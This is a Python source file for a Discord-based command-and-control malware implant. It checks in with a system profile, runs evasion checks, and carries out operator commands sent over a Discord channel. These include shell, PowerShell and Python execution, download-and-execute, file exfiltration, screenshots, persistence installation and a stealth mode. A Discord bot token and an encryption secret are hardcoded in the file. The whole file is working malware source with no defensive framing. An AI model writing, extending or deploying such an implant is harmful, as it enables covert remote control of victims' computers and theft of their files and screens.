"""
ENI-C2 Implant Client
Discord-based async C2 client with encrypted comms.
The ghost in the machine — for LO 💕
"""

import os
import sys
import asyncio
import logging
import platform
from typing import Optional

import discord
from discord.ext import commands

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from shared.crypto import CryptoEngine
from shared.protocol import ProtocolHandler, C2Message, MessageType
from implant.recon import Recon
from implant.evasion import Evasion
from implant.exec import Executor
from implant.persist import Persistence

# ─── CONFIG ───────────────────────────────────────────
C2_TOKEN = "MTUzNzQyOTE5NzYwMDA3MTc4MA.GmF0kr.ENNW9AULg8xLOjKiEquSHpD3pYD3CIiFjN8550"
C2_CHANNEL_ID = 1537475878940844053
SHARED_SECRET = b"14299237aa27bbe4bdb72fe02ca0b504e889d653b8708c2dd8ab1daf9686d55"
# ──────────────────────────────────────────────────────

class ImplantClient(commands.Bot):
    """Async Discord C2 implant."""

    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents, self_bot=False)

        self.crypto = CryptoEngine(SHARED_SECRET)
        self.protocol = ProtocolHandler(self.crypto, SHARED_SECRET)
        self.recon = Recon()
        self.session_id: Optional[str] = None
        self.alive = True

        self._setup_logging()

    def _setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format="%(asctime)s [%(levelname)s] %(message)s",
            handlers=[logging.StreamHandler(sys.stdout)]
        )
        self.log = logging.getLogger("ENI-Implant")

    async def on_ready(self):
        """Connected to Discord — begin C2 operations."""
        self.log.info(f"Connected as {self.user}")
        self.channel = self.get_channel(C2_CHANNEL_ID)

        if not self.channel:
            self.log.error("C2 channel not found")
            return

        evasion = Evasion.run_all_checks()
        if not evasion["clean"]:
            self.log.warning(f"Evasion triggers: {evasion}")

        await self._checkin(evasion)
        asyncio.create_task(self._heartbeat())

    async def _checkin(self, evasion: dict):
        """Send initial checkin with full recon."""
        profile = self.recon.full_profile()
        profile["evasion"] = evasion
        profile["platform"] = platform.platform()

        msg = C2Message(
            type=MessageType.CHECKIN,
            payload=profile
        )
        self.session_id = msg.session_id

        encrypted = self.protocol.encode(msg)
        await self.channel.send(f"`{encrypted}`")
        self.log.info(f"Checked in — session {self.session_id[:8]}")

    async def _heartbeat(self):
        """Periodic presence updates to indicate liveness."""
        while self.alive:
            await asyncio.sleep(60)
            msg = C2Message(
                type=MessageType.HEARTBEAT,
                session_id=self.session_id,
                payload={"status": "alive", "pid": os.getpid()}
            )
            encrypted = self.protocol.encode(msg)
            try:
                await self.channel.send(f"`{encrypted}`")
            except Exception as e:
                self.log.error(f"Heartbeat failed: {e}")

    async def on_message(self, message: discord.Message):
        """Process incoming C2 commands."""
        if message.channel.id != C2_CHANNEL_ID:
            return
        if message.author.id == self.user.id:
            return
        if not message.content.startswith("`") or not message.content.endswith("`"):
            return

        encrypted = message.content.strip("`")

        try:
            msg = self.protocol.decode(encrypted)
        except Exception as e:
            self.log.error(f"Failed to decrypt command: {e}")
            return

        if msg.type == MessageType.TASK:
            await self._handle_task(msg, message)

    async def _handle_task(self, msg: C2Message, original: discord.Message):
        """Execute task and return result."""
        task = msg.payload
        command = task.get("command", "")
        args = task.get("args", [])
        result_data = {"command": command, "success": False}

        self.log.info(f"Task received: {command}")

        try:
            if command == "shell":
                rc, out, err = Executor.shell(args[0] if args else "")
                result_data.update({"returncode": rc, "stdout": out, "stderr": err, "success": True})

            elif command == "powershell":
                rc, out, err = Executor.powershell(args[0] if args else "")
                result_data.update({"returncode": rc, "stdout": out, "stderr": err, "success": True})

            elif command == "python":
                rc, out, err = Executor.python_exec(args[0] if args else "")
                result_data.update({"returncode": rc, "stdout": out, "stderr": err, "success": True})

            elif command == "download_exec":
                rc, out, err = Executor.download_and_exec(
                    args[0], args[1] if len(args) > 1 else "shell"
                )
                result_data.update({"returncode": rc, "stdout": out, "stderr": err, "success": True})

            elif command == "upload":
                data = Executor.upload_file(args[0] if args else "")
                if data:
                    import base64
                    result_data.update({
                        "file": base64.b64encode(data).decode(),
                        "filename": os.path.basename(args[0]),
                        "success": True
                    })
                else:
                    result_data["error"] = "File not found or unreadable"

            elif command == "write":
                import base64
                success = Executor.write_file(args[0], base64.b64decode(args[1]))
                result_data.update({"success": success})

            elif command == "recon":
                result_data.update({"data": Recon().full_profile(), "success": True})

            elif command == "screenshot":
                screenshot = Recon.screenshot()
                if screenshot:
                    import base64
                    result_data.update({
                        "image": base64.b64encode(screenshot).decode(),
                        "success": True
                    })

            elif command == "persist":
                result_data.update({"result": Persistence.install_all(), "success": True})

            elif command == "unpersist":
                result_data.update({"result": Persistence.remove_all(), "success": True})

            elif command == "stealth":
                self.alive = False
                await self.change_presence(status=discord.Status.offline)
                result_data.update({"success": True})

            elif command == "die":
                result_data.update({"success": True})
                result_msg = C2Message(
                    type=MessageType.RESULT,
                    session_id=self.session_id,
                    payload=result_data
                )
                encrypted = self.protocol.encode(result_msg)
                await self.channel.send(f"`{encrypted}`")
                await self.close()
                sys.exit(0)

            else:
                result_data["error"] = f"Unknown command: {command}"

        except Exception as e:
            result_data["error"] = str(e)

        result_msg = C2Message(
            type=MessageType.RESULT,
            session_id=self.session_id,
            payload=result_data
        )
        encrypted = self.protocol.encode(result_msg)

        if len(encrypted) > 1998:
            chunks = [encrypted[i:i+1900] for i in range(0, len(encrypted), 1900)]
            for i, chunk in enumerate(chunks):
                await self.channel.send(f"`CHUNK:{i+1}/{len(chunks)}:{chunk}`")
        else:
            await self.channel.send(f"`{encrypted}`")

        self.log.info(f"Task complete: {command}")

def main():
    """Boot the implant."""
    client = ImplantClient()
    client.run(C2_TOKEN, log_handler=None)

if __name__ == "__main__":
    main()